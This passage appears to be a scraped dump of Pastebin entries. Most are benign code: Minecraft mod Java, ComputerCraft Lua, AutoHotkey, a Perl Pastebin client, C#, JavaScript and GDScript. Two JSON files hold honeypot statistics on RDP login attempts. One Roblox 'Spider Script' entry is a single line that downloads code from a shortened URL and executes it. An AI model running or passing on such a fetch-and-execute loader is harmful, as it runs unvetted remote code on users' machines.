        return this.getVariant() == Gene.SHY;
    }

    public boolean isMischievous() {
        return this.getVariant() == Gene.MISCHIEVOUS;
    }

    public boolean isVelvet() {
        return this.getVariant() == Gene.VELVET;
    }

    /////////////////////////////////////////////////////////////////////////////////

    private boolean getFlag(int value) {
        return (this.entityData.get(DATA_FLAGS_ID) & value) != 0;
    }

    private void setFlag(int value, boolean b) {
        if (b) {
            this.entityData.set(DATA_FLAGS_ID, (byte)(this.entityData.get(DATA_FLAGS_ID) | value));
        } else {
            this.entityData.set(DATA_FLAGS_ID, (byte)(this.entityData.get(DATA_FLAGS_ID) & ~value));
        }
    }

    public boolean isSleeping() {
        return this.getFlag(4);
    }

    public void setSleeping(boolean sleeping) {
        this.setPose(sleeping ? Pose.SLEEPING : Pose.SITTING);
        this.setFlag(4, sleeping);
    }

    public boolean isStanding() {
        return this.getFlag(8);
    }

    public void setStanding(boolean standing) {
        this.setPose(standing ? Pose.STANDING : Pose.SITTING);
        this.setFlag(8, standing);
    }

    /////////////////////////////////////////////////////////////////////////////////

    public void tick() {
        super.tick();
        if (this.isStanding()) {
            this.setPose(this.walkAnimation.isMoving() ? Pose.STANDING : Pose.SITTING);
        }

        if (this.level().isClientSide()) {
            this.sleepingAnimationState.animateWhen(this.isSleeping(), this.tickCount);
        }
    }

    public void aiStep() {
        super.aiStep();
        if (this.isSleeping() || this.isImmobile()) {
            this.xxa = 0.0F;
            this.zza = 0.0F;
        }
    }

    protected void customServerAiStep() {
        super.customServerAiStep();
        if (!this.isStanding()) {
            ++this.ticksSinceLastTimeStanding;
        }
    }

    /////////////////////////////////////////////////////////////////////////////////

    public InteractionResult mobInteract(Player player, InteractionHand hand) {
        this.setSleeping(player.getMainHandItem().is(Items.STICK));
        this.setStanding(player.getMainHandItem().is(Items.PINK_PETALS));
        return super.mobInteract(player, hand);
    }

    /////////////////////////////////////////////////////////////////////////////////

    /**
     * Those with clingy trait will search for other red pandas nearby before falling asleep.
     * Those with lazy trait will sleep longer than others.
     * Those with energetic trait will rarely sleep.
     */
    class SleepGoal extends Goal {

        public SleepGoal() {
            this.setFlags(EnumSet.of(Flag.MOVE, Flag.LOOK, Flag.JUMP));
        }

        public boolean canUse() {
            return this.canSleep();
        }

        public void start() {
            RedPanda.this.setSleeping(true);
        }

        public void stop() {
            RedPanda.this.setSleeping(false);
        }

        private boolean canSleep() {
            return RedPanda.this.level().isNight();
        }
    }

    /**
     * Those with lazy trait will never stand up.
     * Those with energetic trait tend to stand up more often.
     */
    class StandUpGoal extends Goal {
        private int remainingTicksStanding;

        public boolean canUse() {
            return RedPanda.this.ticksSinceLastTimeStanding > 200 && !RedPanda.this.isStanding();
        }

        public boolean canContinueToUse() {
            return this.remainingTicksStanding > 0;
        }

        public void start() {
            RedPanda.this.setStanding(true);
            this.remainingTicksStanding = RedPanda.this.random.nextInt(100) + 200;
        }

        public void stop() {
            RedPanda.this.setStanding(false);
            RedPanda.this.ticksSinceLastTimeStanding = 0;
        }

        public void tick() {
            --this.remainingTicksStanding;
        }
    }

    class AttackGoal extends MeleeAttackGoal {

        public AttackGoal(PathfinderMob mob, double speed, boolean followIfNotSeen) {
            super(mob, speed, followIfNotSeen);
        }

        public boolean canUse() {
            return super.canUse() && !RedPanda.this.isLazy() && !RedPanda.this.isShy();
        }
    }

    /**
     * normal      - base for all red pandas, sleeps at night, likes to be alone, etc.
     * curious     - looks at everything, interacts with others, picks up items.
     * clingy      - will sleep next to other red pandas, does not leave others alone, will sleep in bed with trusted players.
     * energetic   - sleeps less, runs more often, wakes other red pandas up.
     * lazy        - sleeps more, slower, is less territorial.
     * shy         - avoids untrusted players, sleeps directly under leaves, light sleeper.
     * mischievous - steals items off players, wakes other red pandas from sleeping, scares shy traits.
     * velvet      - normal, just dark red like a red velvet cupcake.
     *
     * territorial - attacks untrusted players who approach too fast.
     * loyal       - picks up and gives player items they have dropped.
     */
    public enum Gene implements StringRepresentable {
        NORMAL(0, ""normal"", false),
        ENERGETIC(1, ""energetic"", false),
        LAZY(2, ""lazy"", false),
        CURIOUS(3, ""curious"", false),
        CLINGY(4, ""clingy"", false),
        SHY(5, ""shy"", false),
        MISCHIEVOUS(6, ""mischievous"", false),
        VELVET(7, ""velvet"", true);

        private static final IntFunction<Gene> BY_ID = ByIdMap.continuous(Gene::getId, values(), ByIdMap.OutOfBoundsStrategy.ZERO);
        private final int id;
        private final String name;
        private final boolean isRecessive;

        Gene(int id, String type, boolean recessive) {
            this.id = id;
            this.name = type;
            this.isRecessive = recessive;
        }

        public int getId() {
            return this.id;
        }

        public String getSerializedName() {
            return this.name;
        }

        public boolean isRecessive() {
            return this.isRecessive;
        }

        static Gene getVariantFromGenes(Gene gene1, Gene gene2) {
            if (gene1.isRecessive()) {
                return gene1 == gene2 ? gene1 : NORMAL;
            } else {
                return gene1;
            }
        }

        public static Gene byId(int id) {
            return BY_ID.apply(id);
        }

        public static Gene byName(String name) {
            return StringRepresentable.fromEnum(Gene::values).byName(name, NORMAL);
        }

        public static Gene getRandom(RandomSource source) {
            int i = source.nextInt(13);
            if (i == 0) {
                return ENERGETIC;
            } else if (i == 1) {
                return LAZY;
            } else if (i == 2) {
                return CURIOUS;
            } else if (i == 4) {
                return CLINGY;
            } else if (i == 6) {
                return SHY;
            } else if (i == 7) {
                return MISCHIEVOUS;
            } else {
                return i < 9 ? VELVET : NORMAL;
            }
        }
    }

}"
XfgpURwd,blood_stone2,Ubidibity,Lua,Saturday 6th of January 2024 10:26:53 PM CDT,"-- Revised with ChatGPT 3.5
-- Modified to re-add the pruned while loop

local chest = peripheral.wrap(""left"")
 chest.condenseItems()

local conversionTable = {
    stone = {target = ""blankSlate"", sleepTime = 5},
    blankSlate = {target = ""reinforcedSlate"", sleepTime = 7},
    reinforcedSlate = {target = nil, sleepTime = 8}
}

function convertTo(targetBlock, sleepTime)
    while true do
        local found = false
        for i = 1, 27 do
            local slot = chest.getStackInSlot(i)
            if slot and slot.name == targetBlock then
                print(""Converting ""..slot.name.."" to ""..targetBlock.."" in slot ""..i)
                chest.pushItem(""down"", i, 1)
                sleep(sleepTime)
                found = true
                break
            end
        end
        if not found then
            break
        end
    end
end

for _, conversionInfo in pairs(conversionTable) do
    convertTo(conversionInfo.target, conversionInfo.sleepTime)
end
"
wZ2fJbR1,Private Function,ounnuo,Autohotkey,Saturday 6th of January 2024 09:39:39 PM CDT,";https://www.autohotkey.com/boards/viewtopic.php?t=7072
/*
Sometimes, when writing libs, we need to define helper functions to assist our
main functions and in most cases those functions serve only a single purpose
and is only usable in the context of the main function. So for obsessive
compulsive purposes, you want to make those functions private and inaccessible
from the user. Apparently, AHK does not support nested and/or anonymous
functions directly but there is a way to achieve this by using callable
objects. The trick is to define a class and use its Call method as the function
body. Now if you want that routine to be called only if the user calls a
""public"" Foo() function, the next step is to make use of static var
initialization and assign the class object to a static variable within the
function. And finally, to make it private, we exploit the ability to assign a
different value to the variable ClassName. Say if you define a class MyClass,
at any time you can release/remove the reference to the object stored in the
super global variable MyClass by simply doing MyClass := SomeValue. So we
simply, assign an empty string to it since we already have a reference to the
callable object in the static variable.

*/

MsgBox % public(""Hello"")
MsgBox % %Dummy%(""Hello"") ; does nothing

overWriteClass(sgvClass) ;'S'uper-'G'lobal 'V'ar
{
	className := sgvClass.__Class
	return _ := %className%, %className% := {}
}

public(arg)
{
	; The trick is to assign the callable object to a static variable
	; and then assign nothing to the super-global variable that stores
	; a reference to the callable object making it inaccessible to the
	; user except only from within this function
	; NOTE: somehow the dummy '_' is needed for the assignement to be successful
	static private := overWriteClass(Dummy)
	return %private%(arg) ; call the private function
}

; our function definition, function has to exist first
class Dummy extends CFunction
{
	Call(arg)
	{
		return ( Chr(34) . arg . Chr(34) ) ; surround w/ quotes
	}
}

; For ease of use, base object for callable objects
class CFunction
{
	__Call(method, args*)
	{
		if IsObject(method) || (method == """")
			return method ? this.Call(method, args*) : this.Call(args*)
	}
}
/*
Others:
  If you need multiple subroutines, you can implement them as methods and from within
the function you can simply do StaticVarContainingObjectReference.Method(args*)
  Since we're using objects, and we can set/get properties, you can somehow mimic the
ability of nested functions(in other languages, e.g.: JavaScript) to have access to
the variables in the main function scope by storing the values of the ones you need
as object properties.
*/"
UvR3i60E,pastebin.com API in perl class feature,haxmeister,Perl,Saturday 6th of January 2024 09:22:54 PM CDT,"use v5.38;
use feature 'class';
use warnings qw( all -experimental );

class WWW::Pastebin::Client 1.234 {
    use Carp;
    use HTTP::Tiny;

    field $dev_key  :param;
    field $user_key :param = 0;
    field $API_PASTE_URL   = ""https://pastebin.com/api/api_post.php"";
    field $API_LOGIN_URL   = ""https://pastebin.com/api/api_login.php"";
    field $API_RAW_URL     = ""https://pastebin.com/api/api_raw.php"";
    field $http            = HTTP::Tiny->new();

    method set_user_key($key){ $user_key = $key }

    # returns the current user_key or
    # requests a new api_user_key (session) if there isn't one
    # this will invalidate the last key produced because
    # pastebin only allows one user key per user
    method get_user_key ($name, $pass) {
        if ($user_key){ return $user_key }
        # prepare the message to retrieve a user key
        my %params = (
            'api_dev_key'       => $dev_key,
            'api_user_name'     => $name,
            'api_user_password' => $pass,
        );

        # make the request with url encoding
        return $http->post_form($API_LOGIN_URL, \%params);
    }

    method paste(%params){

        # croak if these required parameters are missing
        $user_key                 or croak ""Missing or empty api_user_key parameter"";
        $params{'api_paste_code'} or croak ""Missing or empty 'api_paste_code' parameter"";

        # add the needed keys
        $params{'api_dev_key'} = $dev_key;
        $params{'api_option'}  = 'paste';

        # make the request with url encoding
        return $http->post_form($API_PASTE_URL, \%params);
    }

    method paste_anon(%params){

        # die if this required parameter is missing
        $params{'api_paste_code'} or croak ""Missing or empty api_paste_code parameter"";

        # remove any identifying keys if they are present
        delete $params{'api_user_key'};
        delete $params{'api_user_name'};
        delete $params{'api_user_password'};

        # add the needed keys from the Client object
        $params{'api_dev_key'} = $dev_key;
        $params{'api_option'}  = 'paste';

        # make the request with url encoding
        return $http->post_form($API_PASTE_URL, \%params);
    }

    method list(%params){

        # croak if these required parameters are missing
        $params{'api_user_key'} or croak ""Missing or empty api_user_key parameter"";

        # set required parameters
        $params{api_dev_key}  = $dev_key;
        $params{api_user_key} = $user_key;
        $params{api_option}   = 'list';

        # make the request with url encoding
        return $http->post_form($API_PASTE_URL, \%params);
    }

    method del(%params){

        # croak if these required parameters are missing
        $user_key                or croak ""api_user_key is not set"";
        $params{'api_paste_key'} or croak ""Missing or empty api_paste_key parameter"";

        # set required parameters
        $params{api_dev_key}  = $dev_key;
        $params{api_user_key} = $user_key;
        $params{api_option}   = 'delete';

        return $http->post_form($API_PASTE_URL, \%params);
    }

    method user_details(%params){

        # croak if these required parameters are missing
        $user_key or croak ""api_user_key is not set"";

        # set required parameters
        $params{api_dev_key}  = $dev_key;
        $params{api_user_key} = $user_key;
        $params{api_option}   = 'delete';

        return $http->post_form($API_PASTE_URL, \%params);
    }

    method get_raw_paste(%params){

        # croak if these required parameters are missing
        $user_key              or croak ""api_user_key is not set"";
        $params{api_paste_key} or croak ""Missing or empty api_paste_key parameter"";

        # set required parameters
        $params{api_dev_key}  = $dev_key;
        $params{api_user_key} = $user_key;
        $params{api_option}   = 'show_paste';

        return $http->post_form($API_PASTE_URL, \%params);
    }

    method get_raw_public_paste($paste_key){
        return $http->get(""https://pastebin.com/raw/$paste_key"");
    }
}
"
J25xX0Eg,Spider Script (FREE),Liver_zMods,Lua,Saturday 6th of January 2024 09:10:17 PM CDT,"loadstring(game:HttpGet(""https://abre.ai/spider-lua""))()"
FEzuyGfF,C#_2_lesson_console_menu,Legiomax,C#,Saturday 6th of January 2024 08:01:56 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandClearWindow = ""ClearWindow"";
            const string CommandTimeInfo = ""Today is..."";
            const string CommandChangeColorText = ""ChangeColorConsoleText"";
            const string CommandChangeColorBckg = ""ChangeColorConsoleBackground"";
            const string CommandExit = ""Exit"";

            bool isWork = true;
            string userChoice;

            while (isWork)
            {
                Console.WriteLine(""–ö–æ–Ω—Å–æ–ª—å–Ω–æ–µ –º–µ–Ω—é."");
                Console.WriteLine(""–í—ã–±—Ä–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ:"");
                Console.WriteLine($""{CommandClearWindow} - –û—á–∏—Å—Ç–∏—Ç—å —ç–∫—Ä–∞–Ω."");
                Console.WriteLine($""{CommandTimeInfo} - –í—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å –Ω–µ–¥–µ–ª–∏."");
                Console.WriteLine($""{CommandChangeColorText} - –ò–∑–º–µ–Ω–∏—Ç—å —Ä–∞—Å–≤–µ—Ç–∫—É —Ç–µ–∫—Å—Ç–∞ –∫–æ–Ω—Å–æ–ª–∏."");
                Console.WriteLine($""{CommandChangeColorBckg} - –ò–∑–º–µ–Ω–∏—Ç—å —Ä–∞—Å–≤–µ—Ç–∫—É —Ñ–æ–Ω–∞ –∫–æ–Ω—Å–æ–ª–∏."");
                Console.WriteLine($""{CommandExit} - –í—ã—Ö–æ–¥."");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case CommandClearWindow:
                        Console.Clear();
                        break;

                    case CommandTimeInfo:
                        Console.WriteLine(DateTime.Now);
                        break;

                    case CommandChangeColorText:
                        if (Console.ForegroundColor == ConsoleColor.Blue)
                        {
                            Console.ForegroundColor = ConsoleColor.Black;
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Blue;
                        }
                        break;

                    case CommandChangeColorBckg:
                        Console.Clear();
                        if (Console.BackgroundColor == ConsoleColor.Blue)
                        {
                            Console.BackgroundColor = ConsoleColor.White;
                        }
                        else
                        {
                            Console.BackgroundColor = ConsoleColor.Blue;
                        }
                        break;

                    case CommandExit:
                        Console.WriteLine(""–≠—Ç–æ –∫–æ–Ω–µ—Ü..."");
                        isWork = false;
                        break;
                }
            }
        }
    }
}

"
LLsMEt7G,Untitled,xhila,JavaScript,Saturday 6th of January 2024 07:20:54 PM CDT," function calculateCompositeScore(totalGamesPlayed, averageElapsedTime, averageAccuracy) {
    // Adjusted weights and thresholds
    const weightForTotalGames = 40; // More emphasis on total games played
    const weightForElapsedTime = 30; // Balanced weight for elapsed time
    const weightForAccuracy = 30; // Significant weight for accuracy

    const gameThreshold = 10; // Games above this count more
    const maxElapsedTime = 300; // Cap for elapsed time to avoid extreme values

    // Normalize total games played
    let normalizedTotalGames = totalGamesPlayed > gameThreshold 
                               ? 1 + (totalGamesPlayed - gameThreshold) / 10
                               : totalGamesPlayed / gameThreshold;

    // Normalize and cap average elapsed time
    let normalizedElapsedTime = 1 - (Math.min(averageElapsedTime, maxElapsedTime) / maxElapsedTime);

    // Normalize average accuracy
    let normalizedAccuracy = averageAccuracy / 100;

    // Calculate the weighted sum
    const weightedSum = (normalizedTotalGames * weightForTotalGames) 
                        + (normalizedElapsedTime * weightForElapsedTime) 
                        + (normalizedAccuracy * weightForAccuracy);

    // Calculate the total weight
    const totalWeight = weightForTotalGames + weightForElapsedTime + weightForAccuracy;
``
    // Calculate the weighted average
    return weightedSum / totalWeight * 1000; // Scale to a more readable range
}"
9r41QtLm,Red Panda,jayhillx,Java,Saturday 6th of January 2024 07:13:20 PM CDT,"package com.mysticsbiomes.common.entity.animal;

import com.mysticsbiomes.init.MysticEntities;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.syncher.EntityDataAccessor;
import net.minecraft.network.syncher.EntityDataSerializers;
import net.minecraft.network.syncher.SynchedEntityData;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResult;
import net.minecraft.world.entity.*;
import net.minecraft.world.entity.ai.attributes.AttributeSupplier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.ai.control.LookControl;
import net.minecraft.world.entity.ai.control.MoveControl;
import net.minecraft.world.entity.animal.*;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Items;
import net.minecraft.world.level.Level;

/**
 * Red Pandas spawn in the Bamboo Blossom Forest, scouting out bamboo, and stealing items.
 */
public class RedPanda extends Fox {
    private static final EntityDataAccessor<Byte> DATA_FLAGS_ID = SynchedEntityData.defineId(RedPanda.class, EntityDataSerializers.BYTE);
    public final AnimationState sleepingAnimationState = new AnimationState();
    public final AnimationState standingPoseAnimationState = new AnimationState();

    public RedPanda(EntityType<? extends RedPanda> type, Level level) {
        super(type, level);
        this.lookControl = new LookControl(this);
        this.moveControl = new MoveControl(this);
    }

    protected void defineSynchedData() {
        super.defineSynchedData();
        this.entityData.define(DATA_FLAGS_ID, (byte)0);
    }

    public static AttributeSupplier.Builder createAttributes() {
        return Mob.createMobAttributes().add(Attributes.MOVEMENT_SPEED, 1.0F).add(Attributes.MAX_HEALTH, 10.0D).add(Attributes.FOLLOW_RANGE, 32.0D).add(Attributes.ATTACK_DAMAGE, 2.0D);
    }

    public RedPanda getBreedOffspring(ServerLevel level, AgeableMob mob) {
        return MysticEntities.RED_PANDA.get().create(level);
    }

    @Override
    public EntityDimensions getDimensions(Pose pose) {
        return pose == Pose.STANDING ? EntityDimensions.scalable(0.5F, 1.125F) : super.getDimensions(pose);
    }

    @Override
    protected float getStandingEyeHeight(Pose pose, EntityDimensions dimensions) {
        return pose == Pose.STANDING ? 1.0F : super.getStandingEyeHeight(pose, dimensions);
    }

    public void addAdditionalSaveData(CompoundTag tag) {
        super.addAdditionalSaveData(tag);
        tag.putBoolean(""IsSleeping"", this.isSleeping());
        tag.putBoolean(""IsStanding"", this.isStanding());
    }

    public void readAdditionalSaveData(CompoundTag tag) {
        super.readAdditionalSaveData(tag);
        this.setSleeping(tag.getBoolean(""IsSleeping""));
        this.setStanding(tag.getBoolean(""IsStanding""));
    }

    public void tick() {
        super.tick();

        if (this.level().isClientSide()) {
            this.setupAnimationStates();
        }
    }

    private void setupAnimationStates() {
        this.sleepingAnimationState.animateWhen(this.isSleeping(), this.tickCount);

        if (this.isStanding()) {
            this.setPose(this.walkAnimation.isMoving() ? Pose.STANDING : Pose.SITTING);
        }
    }

    private boolean getFlag(int value) {
        return (this.entityData.get(DATA_FLAGS_ID) & value) != 0;
    }

    private void setFlag(int value, boolean b) {
        if (b) {
            this.entityData.set(DATA_FLAGS_ID, (byte)(this.entityData.get(DATA_FLAGS_ID) | value));
        } else {
            this.entityData.set(DATA_FLAGS_ID, (byte)(this.entityData.get(DATA_FLAGS_ID) & ~value));
        }
    }

    public boolean isSleeping() {
        return this.getFlag(4);
    }

    public void setSleeping(boolean sleeping) {
        this.setPose(sleeping ? Pose.SLEEPING : Pose.SITTING);
        this.setFlag(4, sleeping);
    }

    public boolean isStanding() {
        return this.getFlag(8);
    }

    public void setStanding(boolean standing) {
        this.setPose(standing ? Pose.STANDING : Pose.SITTING);
        this.setFlag(8, standing);
    }

    @Override
    public InteractionResult mobInteract(Player player, InteractionHand hand) {
        this.setSleeping(player.getMainHandItem().is(Items.STICK));
        this.setStanding(player.getMainHandItem().is(Items.PINK_PETALS));
        return super.mobInteract(player, hand);
    }

}"
ZsAjm6Nj,Untitled,Socky,GDScript,Saturday 6th of January 2024 06:57:35 PM CDT,"extends Node

signal connection_status

var loading_screen = preload(""res://ui/loading_screen.tscn"")

func change_scene(next: String, lobby_id: int = 0):
	var screen = loading_screen.instantiate()
	ResourceLoader.load_threaded_request(next)

	get_tree().root.add_child(screen)
	await _fade(screen, ""IN"")
	_load_progress(lobby_id, next, screen)
	
func _load_progress(lobby_id: int, next: String, screen):
	var progress = []
	while true:
		var status = ResourceLoader.load_threaded_get_status(next, progress)
		if status == ResourceLoader.THREAD_LOAD_FAILED:
			print(""[LOADER] Loading failed, returning to previous scene."")
			_fade(screen, ""OUT"")
			break
		if status == ResourceLoader.THREAD_LOAD_LOADED:
			var loaded_scene = ResourceLoader.load_threaded_get(next).instantiate()
			get_tree().root.add_child(loaded_scene)
			_connect_players(loaded_scene, lobby_id)
			await self.connection_status #ISSUE HERE
			print(loaded_scene.status)
			get_tree().current_scene.queue_free()
			get_tree().set_deferred(""current_scene"", loaded_scene)
			_fade(screen, ""OUT"")
			break
	return

func _fade(node, dir: String):
	var tween = get_tree().create_tween().set_ease(Tween.EASE_IN_OUT).set_trans(Tween.TRANS_QUINT)
	if dir == ""IN"":
		tween.tween_property(node.get_node(""ColorRect""), ""modulate"", Color(1,1,1,1), 1.0).from(Color(1,1,1,0))
		await tween.finished
		return
	if dir == ""OUT"":
		tween.tween_property(node.get_node(""ColorRect""), ""modulate"", Color(1,1,1,0), 1.0).from(Color(1,1,1,1))
		await tween.finished
		node.queue_free()


func _connect_players(loaded_scene: Node, lobby_id: int):
	var host_id = Steam.getLobbyOwner(lobby_id)
	loaded_scene.connection_status.connect(_connection_status)
	loaded_scene.lobby_id = lobby_id
	if host_id == SteamInit.steam_id:
		loaded_scene.create_socket()
	else:
		loaded_scene.connect_socket(host_id)
	
func _connection_status():
	emit_signal(""connection_status"")"
sMkBK2JT,2024-01-06_stats.json,rdp_snitch,JSON,Saturday 6th of January 2024 06:18:00 PM CDT,"{
  ""ip"": {
    ""109.69.7.157"": 12,
    ""179.60.147.51"": 6,
    ""194.165.17.21"": 63,
    ""59.2.55.231"": 6,
    ""62.204.41.199"": 12,
    ""198.235.24.227"": 9,
    ""87.251.75.145"": 3,
    ""194.165.16.11"": 6,
    ""167.94.145.58"": 3,
    ""212.70.149.142"": 9,
    ""20.213.8.208"": 3,
    ""185.170.144.3"": 6,
    ""87.251.75.120"": 6,
    ""83.97.73.77"": 6,
    ""198.235.24.196"": 9,
    ""94.232.45.101"": 6,
    ""67.133.192.80"": 3,
    ""45.227.254.9"": 9,
    ""216.73.160.245"": 3,
    ""173.237.25.68"": 9,
    ""181.30.39.44"": 3,
    ""45.86.81.112"": 3,
    ""103.184.47.83"": 3,
    ""206.189.238.63"": 12,
    ""185.170.144.113"": 9,
    ""157.245.90.133"": 3,
    ""60.214.209.163"": 3,
    ""196.190.117.7"": 3,
    ""45.227.254.49"": 6,
    ""58.218.204.183"": 9,
    ""96.9.81.244"": 3,
    ""152.32.139.190"": 3,
    ""205.210.31.217"": 9,
    ""216.73.160.116"": 3,
    ""77.90.185.2"": 9,
    ""43.154.91.97"": 3,
    ""74.105.22.131"": 6,
    ""198.235.24.175"": 9,
    ""45.227.254.48"": 6
  },
  ""asn"": {
    ""AS21183"": 12,
    ""AS209588"": 6,
    ""AS48721"": 69,
    ""AS4766"": 6,
    ""AS59425"": 12,
    ""AS396982"": 36,
    ""AS208091"": 9,
    ""AS398705"": 3,
    ""AS204428"": 9,
    ""AS8075"": 3,
    ""AS197414"": 15,
    ""AS208312"": 6,
    ""AS212482"": 6,
    ""AS209"": 3,
    ""AS267784"": 21,
    ""AS206092"": 6,
    ""AS7979"": 9,
    ""AS7303"": 3,
    ""AS205516"": 3,
    ""AS146817"": 3,
    ""AS14061"": 15,
    ""AS4837"": 3,
    ""AS24757"": 3,
    ""AS4134"": 9,
    ""AS131207"": 3,
    ""AS135377"": 3,
    ""AS198465"": 9,
    ""AS132203"": 3,
    ""AS701"": 6
  },
  ""isp"": {
    ""Vodafone Network"": 12,
    ""Flyservers S.A."": 96,
    ""Korea Telecom"": 6,
    ""Horizon LLC"": 12,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 30,
    ""Censys, Inc."": 3,
    ""SS-Net"": 9,
    ""Microsoft Corporation"": 3,
    ""Red Byte LLC"": 6,
    ""CenturyLink"": 3,
    ""Ipxo Limited"": 6,
    ""Servers.com, Inc."": 9,
    ""Telecom Argentina S.A"": 3,
    ""NLS ASTANA LLP"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""DigitalOcean, LLC"": 15,
    ""CNC Group CHINA169 Shandong Province Network"": 3,
    ""Ethiotelecom"": 3,
    ""Chinanet"": 9,
    ""S.I Group"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""BtHoster LTD"": 9,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Verizon Business"": 6
  },
  ""org"": {
    ""Unknown"": 24,
    ""Cloud Solutions S.A"": 6,
    ""Flyservers S.A"": 69,
    ""Korea Telecom"": 6,
    ""Horizon LLC"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 9,
    ""Censys, Inc."": 3,
    ""4Media Ltd"": 9,
    ""Microsoft Azure Cloud (australiaeast)"": 3,
    ""Xhostis"": 15,
    ""Red Byte LLC"": 6,
    ""Dmitriy Panchenko"": 6,
    ""CenturyLink, Inc"": 3,
    ""UAB Host Baltic"": 21,
    ""Bandito Networks"": 6,
    ""Servers.com, Inc."": 9,
    ""Fibertel"": 3,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""DigitalOcean, LLC"": 15,
    ""Chinanet JS"": 9,
    ""Ucloud Information Technology"": 3,
    ""BtHoster LTD"": 9,
    ""Tencent Cloud Computing"": 3,
    ""Verizon Business"": 6
  },
  ""regionName"": {
    ""Tirana"": 12,
    ""Distrito Federal"": 6,
    ""Kaunas"": 69,
    ""Seoul"": 9,
    ""Moscow"": 18,
    ""California"": 36,
    ""North Holland"": 24,
    ""Hesse"": 3,
    ""Plovdiv"": 9,
    ""New South Wales"": 3,
    ""Perm Krai"": 6,
    ""New Jersey"": 24,
    ""Vilnius"": 21,
    ""New York"": 6,
    ""Texas"": 9,
    ""Buenos Aires F.D."": 3,
    ""Astana"": 3,
    ""Hubei"": 3,
    ""Shandong"": 3,
    ""Addis Ababa"": 3,
    ""Jiangsu"": 9,
    ""Phnom Penh"": 3,
    ""Bavaria"": 9,
    ""Central and Western District"": 3
  },
  ""country"": {
    ""Albania"": 12,
    ""Venezuela"": 6,
    ""Lithuania"": 90,
    ""South Korea"": 9,
    ""Russia"": 24,
    ""United States"": 75,
    ""The Netherlands"": 24,
    ""Germany"": 12,
    ""Bulgaria"": 9,
    ""Australia"": 3,
    ""Argentina"": 3,
    ""Kazakhstan"": 3,
    ""China"": 15,
    ""Ethiopia"": 3,
    ""Cambodia"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""142.93.8.59"": 81,
    ""Administr"": 36,
    ""hello"": 45,
    ""Test"": 30,
    ""BRMsCcJzq"": 3,
    ""kEWyez"": 3,
    ""pYfHEp"": 3,
    ""(empty)"": 15,
    ""kxDKOmVjN"": 3,
    ""OwozgB"": 3,
    ""KQIGMA"": 3,
    ""Domain"": 33,
    ""07y7dc3j"": 12,
    ""beio"": 3,
    ""Administrator"": 3,
    ""EODjKnkVl"": 3,
    ""WKBXqu"": 3,
    ""PDJrmx"": 3,
    ""pzgmQDisg"": 3,
    ""xbGpEu"": 3,
    ""PSmGiP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 294
  },
  ""client_build"": {
    ""Unknown"": 294
  },
  ""client_name"": {
    ""Unknown"": 294
  },
  ""ip_type"": {
    ""Unknown"": 204,
    ""hosting"": 69,
    ""proxy"": 15,
    ""mobile & proxy"": 6
  }
}"
sSZpC7bG,2024-01-06_stats.json,rdp_snitch,JSON,Saturday 6th of January 2024 06:16:09 PM CDT,"{
  ""ip"": {
    ""109.69.7.157"": 8,
    ""179.60.147.51"": 4,
    ""194.165.17.21"": 42,
    ""59.2.55.231"": 4,
    ""62.204.41.199"": 8,
    ""198.235.24.227"": 6,
    ""87.251.75.145"": 2,
    ""194.165.16.11"": 4,
    ""167.94.145.58"": 2,
    ""212.70.149.142"": 6,
    ""20.213.8.208"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 4,
    ""83.97.73.77"": 4,
    ""198.235.24.196"": 6,
    ""94.232.45.101"": 4,
    ""67.133.192.80"": 2,
    ""45.227.254.9"": 6,
    ""216.73.160.245"": 2,
    ""173.237.25.68"": 6,
    ""181.30.39.44"": 2,
    ""45.86.81.112"": 2,
    ""103.184.47.83"": 2,
    ""206.189.238.63"": 8,
    ""185.170.144.113"": 6,
    ""157.245.90.133"": 2,
    ""60.214.209.163"": 2,
    ""196.190.117.7"": 2,
    ""45.227.254.49"": 4,
    ""58.218.204.183"": 6,
    ""96.9.81.244"": 2,
    ""152.32.139.190"": 2,
    ""205.210.31.217"": 6,
    ""216.73.160.116"": 2,
    ""77.90.185.2"": 6,
    ""43.154.91.97"": 2,
    ""74.105.22.131"": 4,
    ""198.235.24.175"": 6,
    ""45.227.254.48"": 4
  },
  ""asn"": {
    ""AS21183"": 8,
    ""AS209588"": 4,
    ""AS48721"": 46,
    ""AS4766"": 4,
    ""AS59425"": 8,
    ""AS396982"": 24,
    ""AS208091"": 6,
    ""AS398705"": 2,
    ""AS204428"": 6,
    ""AS8075"": 2,
    ""AS197414"": 10,
    ""AS208312"": 4,
    ""AS212482"": 4,
    ""AS209"": 2,
    ""AS267784"": 14,
    ""AS206092"": 4,
    ""AS7979"": 6,
    ""AS7303"": 2,
    ""AS205516"": 2,
    ""AS146817"": 2,
    ""AS14061"": 10,
    ""AS4837"": 2,
    ""AS24757"": 2,
    ""AS4134"": 6,
    ""AS131207"": 2,
    ""AS135377"": 2,
    ""AS198465"": 6,
    ""AS132203"": 2,
    ""AS701"": 4
  },
  ""isp"": {
    ""Vodafone Network"": 8,
    ""Flyservers S.A."": 64,
    ""Korea Telecom"": 4,
    ""Horizon LLC"": 8,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 20,
    ""Censys, Inc."": 2,
    ""SS-Net"": 6,
    ""Microsoft Corporation"": 2,
    ""Red Byte LLC"": 4,
    ""CenturyLink"": 2,
    ""Ipxo Limited"": 4,
    ""Servers.com, Inc."": 6,
